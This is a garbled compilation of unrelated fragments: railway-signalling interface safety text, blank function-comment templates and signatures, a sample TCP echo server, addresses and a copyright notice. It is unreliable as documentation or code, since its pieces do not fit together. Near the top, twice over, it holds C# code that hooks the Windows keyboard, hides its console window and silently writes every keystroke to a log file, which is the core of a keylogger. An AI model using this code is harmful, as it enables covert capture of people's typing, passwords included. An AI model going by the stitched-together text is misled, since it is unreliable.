The system shall be tested in accordance with all relevant standards unless a derogation or TNC has been granted and with all applicable legislation. Where it is necessary to 

All interfaces between subsystems shall be designed so that the overall behaviour of the system is as intended. Allowance shall be made for differences in the manner in which 

All interfaces between subsystems shall be designed so that the overall behaviour of the system is as intended. Allowance shall be made for differences in the manner in which the different subsystems respond to input stimuli such as differences in response time by equipment using different technologies and indeterminate effects that arise from asynchronous operating cycles in different subsystems. It shall be confirmed that the effects of reasonably foreseeable unintended behaviour of any subsystem does not result in dangerous behaviour arising in any other subsystem.


thread = new System.Threading.Thread(new System.Threading.ThreadStart(ReceiveThread));

thread.Start();

[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

// The two dll imports below will handle the window hiding.

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;

using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;

private const int WH_KEYBOARD_LL = 13;
private const int WM_KEYDOWN = 0x0100;
private static LowLevelKeyboardProc _proc = HookCallback;
private static IntPtr _hookID = IntPtr.Zero;

 private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(
        int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            Console.WriteLine((Keys)vkCode);
            StreamWriter sw = new StreamWriter(Application.StartupPath+ @"\log.txt",true);
            sw.Write((Keys)vkCode);
            sw.Close();
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

   var handle = GetConsoleWindow();

        // Hide
        ShowWindow(handle, SW_HIDE);

_hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);

 private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;


        private delegate IntPtr LowLevelKeyboardProc(
       int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Console.WriteLine((Keys)vkCode);
                StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
                sw.Write((Keys)vkCode);
                sw.Close();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // The two dll imports below will handle the window hiding.

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;

using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;

 var handle = GetConsoleWindow();

        // Hide
        ShowWindow(handle, SW_HIDE);

        _hookID = SetHook(_proc);

/**
<pre>
FUNCTION:                                                                  
  void GetDecodeStats(DWORD *goodC, DWORD *badC, DWORD *goodA, DWORD *badA)

DESCRIPTION:                                                               
  Access function for the global variables counting good and failed NVFB3  
  decodes                                                                  

PARAMETERS:                                                                
  DWORD *goodC      Output parameter to contain good control request count 
  DWORD *badC       Output parameter to contain bad control request count  
  DWORD *goodA      Output parameter good ARS subarea status request count 
  DWORD *badA       Output parameter bad ARS subarea status request count  

RETURNS:                                                                   
  void                                                                     
</pre>
*/

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

void InitialiseConnectionInformation()


/**
<pre>
FUNCTION:                                                                  
  void InitialiseConnectionInformation()
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

ConnectionListInformation_t * GetConnection(WORD index)

/**
<pre>
FUNCTION:                                                                  
  ConnectionListInformation_t * GetConnection(WORD index)

DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

ConnectionListInformation_t *GetConnectionInformation(DWORD Socket)

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

WORD HandleIncomingDataStream(DWORD Socket, const char *request);

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/


void CALLBACK IconisTransmitPeriod(UINT wTimerID, UINT msg, DWORD dwUser, DWORD dw1, DWORD dw2);

periodically called every 250ms

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/


/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

will crate a new connection or extract one thats already in use.

void CreateNewConnection(DWORD Socket, char *ipaddress);

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

void CloseAConnection(DWORD Socket)

DWORD Socket

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

WORD isMaster(WORD connectionID)

WORD connectionID

UINT wTimerID, UINT msg, DWORD dwUser, DWORD dw1, DWORD dw2

DWORD Socket, const char *request

WORD

DWORD Socket

WORD index

ConnectionListInformation_t *

WORD printConnectionInformationToString(char *output, WORD n)

char *output, WORD n

WORD printConnectionStatInformationToString(char *output, WORD n)

char *output, WORD n

MCS_if.c

MCS_PS9.c

NVFB3.c

SocketInit.cp

DecodeNVFB3Data.cpp

EncodeNVFB3Data.cpp

EncodeDecodeCRC.cpp

DoProcess.cpp

EncodeDecodeBase64.cpp

MCS_if

MCS_PS9.c

NVFB3.c

SocketInit.cpp

DecodeNVFB3Data.cpp

EncodeDecodeCRC.cpp

EncodeNVFB3Data.cpp

DoProcess.cpp

EncodeDecodeBase64.cpp

8	Make sure the connection is broken as soon as any information has been corrupted. This can be done by modifying the information on the ICONIS Simulator. As soon as the SRIF see the information is incorrect the link will be dropped. 
The ICONIS Simulator should then be able to reconnect with no issue.


#using <System.dll>

using namespace System;
using namespace System::IO;
using namespace System::Net;
using namespace System::Net::Sockets;
using namespace System::Text;
using namespace System::Threading;
void main()
{
   try
   {

      // Set the TcpListener on port 13000.
      Int32 port = 13000;
      IPAddress^ localAddr = IPAddress::Parse( "127.0.0.1" );

      // TcpListener* server = new TcpListener(port);
      TcpListener^ server = gcnew TcpListener( localAddr,port );

      // Start listening for client requests.
      server->Start();

      // Buffer for reading data
      array<Byte>^bytes = gcnew array<Byte>(256);
      String^ data = nullptr;

      // Enter the listening loop.
      while ( true )
      {
         Console::Write( "Waiting for a connection... " );

         // Perform a blocking call to accept requests.
         // You could also user server.AcceptSocket() here.
         TcpClient^ client = server->AcceptTcpClient();
         Console::WriteLine( "Connected!" );
         data = nullptr;

         // Get a stream Object* for reading and writing
         NetworkStream^ stream = client->GetStream();
         Int32 i;

         // Loop to receive all the data sent by the client.
         while ( i = stream->Read( bytes, 0, bytes->Length ) )
         {

            // Translate data bytes to a ASCII String*.
            data = Text::Encoding::ASCII->GetString( bytes, 0, i );
            Console::WriteLine( "Received: {0}", data );

            // Process the data sent by the client.
            data = data->ToUpper();
            array<Byte>^msg = Text::Encoding::ASCII->GetBytes( data );

            // Send back a response.
            stream->Write( msg, 0, msg->Length );
            Console::WriteLine( "Sent: {0}", data );
         }

         // Shutdown and end connection
         client->Close();
      }
   }
   catch ( SocketException^ e ) 
   {
      Console::WriteLine( "SocketException: {0}", e );
   }

   Console::WriteLine( "\nHit enter to continue..." );
   Console::Read();
}

SWIA 2DB

6 Craigs Court,
Whitehal

	
BT IT Services
Whitehall TE, 
6 Craigs Court,
Whitehall

Technical Consultants

 if ((logmask & gLogmask) || (logmask == ALWAYS))
    {

EnterCriticalSection

MCSIF

LOGGER("Cannot lock the mutext must wait until free", "", MCSIF);

LOGMASK_MCSIF

        Sleep(50);


hWnd,

Horsforth

0aa502000c00c31eda5494c7d754aa550d000100000000000000000006050000080000000000400024

annot lock the interlockin mu

	
BT IT Services
Whitehall TE, 
6 Craigs Court,
Whitehall
SWIA 2DB

TcpListener

INADDR_ANY

IPAddress

4.2_004 

Familiennachzug 

family reunion

will cause the hardware watchdog to timeout, resulting in a changeover to the standby processor

Any reasonably foreseeable uninteded beaviour from the connection to the saftey gateway will either result in a dropping of a NVFB3 packet, because of CRC fail, or the connection will be severed because of failed signing or timeout within the connection. Either of these cases the data will not reach the MCS and therefore never alter an interlockings state.  Any ireasonable foreseeable unitended behaviour from the Application it self will cause the hardware watchdog to timeout, resulting in a changeover to the standby processor.

Informatiq Consulting 

Any reasonably foreseeable uninteded beaviour from the connection to the saftey gateway will either result in a dropping of a NVFB3 packet, because of CRC fail, or the connection will be severed because of failed signing or timeout within the connection. Either of these cases the data will not reach the MCS and therefore never alter an interlockings state.  Any ireasonable foreseeable unitended behaviour from the Application it self will cause the hardware watchdog to timeout, resulting in a changeover to the standby processor.

SR-SRIF-108

Copyright ? 2016 Alstom Transport UK Ltd. 
All rights reserved.

This document is the property of Alstom Transport UK Ltd and may not be copied in any form without the express permission of Alstom Transport UK Ltd. It is entrusted to SSL for their information only.  The information contained herein is proprietary and confidential and may not be transferred, transported, or transmitted by any means without the express permission of Alstom Transport UK Ltd. Alstom Transport UK Ltd makes no guarantee to the completeness or the correctness of the information contained in this document and retains the right to make changes at any time, without notice.


Alstom Transport UK Ltd

/**
<pre>
FUNCTION:                                                                  
   WORD HandleIncomingDataStream(DWORD Socket, const char *request);

DESCRIPTION:                                                               
  
PARAMETERS:                                                       
    DWORD Socket,
    const char *request
  
RETURNS:                                                                   
  WORD

</pre>
*/

void createLogFile()

reated the log file based on the current date and time so
* each log file is unique

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

void logger(const char *text , UINT32 logmask)

switches on
* #define ALWAYS   0xffffffff
* #define LOGMASK_TCP         0x00000001
* #define LOGMASK_MAIN        0x00000002
* #define LOGMASK_SIGNING     0x00000004
* #define LOGMASK_ICONISIF    0x00000008
* #define LOGMASK_MCSIF       0x00000010
* #define LOGMASK_MCSPS9      0x00000020
* #define LOGMASK_NVFB3       0x00000040
* #define LOGMASK_SRIFMAIN    0x00000080

const char *text , UINT32 logmask

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/


void logger_hex(BYTE* pHex, size_t len, UINT32 logmask)

BYTE* pHex, size_t len, UINT32 logmask

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

void logger_s(const char *text, const char* val, UINT32 logmask)

const char *text, const char* val, UINT32 logmask

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/


void logger_1(const char *text, unsigned val, UINT32 logmask)

const char *text, unsigned val, UINT32 logmask

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

void writeToLoggerFile(const char *text, UINT32 logmask)

const char *text, UINT32 logmask

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

void WriteSrifInputToInterfaceDebugFile(const char* text)

const char* text

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

void WriteSrifOutputToInterfaceDebugFile(const char* text)

const char* text

50000000

MAX_LOG_SIZE

SRIFInputInterfaceDebug.txt

SRIFOutputInterfaceDebug

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

int APIENTRY _tWinMain(HINSTANCE hInstance,
                       HINSTANCE hPrevInstance,
                       LPTSTR    lpCmdLine,
                       int       nCmdShow)


HINSTANCE hInstance,
                       HINSTANCE hPrevInstance,
                       LPTSTR    lpCmdLine,
                       int       nCmdShow

Main program entry point

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

void PrintDisplayBufferToScreen()

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

void PrintDebugToScreen(const char *text, UINT32 logmask)

const char *text, UINT32 logmask

print debug to buffer and then to scree

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/


void PrintToScreen(const char* text, int number)

prints to screen using the SPRINT function

const char* text, int number

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/


BOOL CALLBACK UnitTestDlgProc(HWND hwnd, UINT Message, WPARAM wParam, LPARAM lParam)

HWND hwnd, UINT Message, WPARAM wParam, LPARAM lParam

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/


void initialiseSharedMemory()

initialised shared memory

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

ATOM MyRegisterClass(HINSTANCE hInstance)

    This function and its usage are only necessary if you want this code
//    to be compatible with Win32 systems prior to the 'RegisterClassEx'
//    function that was added to Windows 95. It is important to call this function
//    so that the application will get 'well formed' small icons associated
//    with it.

HINSTANCE hInstance

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)

Saves instance handle and creates main window

     In this function, we save the instance handle in a global variable and
//        create and display the main program window.

HINSTANCE hInstance, int nCmdShow

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

put string into char* out

void PieceTogetherSystemTime(SYSTEMTIME myTime, char *out)

SYSTEMTIME myTime, char *out

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/


void CALLBACK MMtimer(UINT wTimerID, UINT msg, DWORD dwUser, DWORD dw1, DWORD dw2)

This timer check the master slave status,
* writes to the watch dog timer
* writes to the DO count.
* periodically send message to redundant system if present
* checks that the all connection are still alive

UINT wTimerID, UINT msg, DWORD dwUser, DWORD dw1, DWORD dw2

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

void Create_MCS_CE_IF_thread()

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

 LONG SPRINT( HWND hDlg, LONG Row, LONG Col, LONG Ink, const char *PrintStr)

HWND hDlg, LONG Row, LONG Col, LONG Ink, const char *PrintStr

 Message handler for about box.

INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)

INT_PTR

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/


void ShowText(DISPLAY_Location_e location, const char *otxt)

DISPLAY_Location_e location, const char *otxt

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

WORD SendUDPMessage(char* ipaddress, char* message)

send UDP message to ipaddress

char* ipaddress, char* message

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

 decodes the messages from the other machine and synchronises the
* sequence number if the other machine is the master.
* message is encoded in a simple xml message
* <Message><Status>MASTER</Status>
* <SequenceNumber>0</SequenceNumber><DigestValue>AAAAA</DigestValue>
* </Message>
* the digest value detects modification

WORD decodeInterSRIFMessage(char* input)

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/


DWORD WINAPI recvThread(LPVOID lpParameter)

Receive the UDP packets from the other machine if it exists.

LPVOID lpParameter

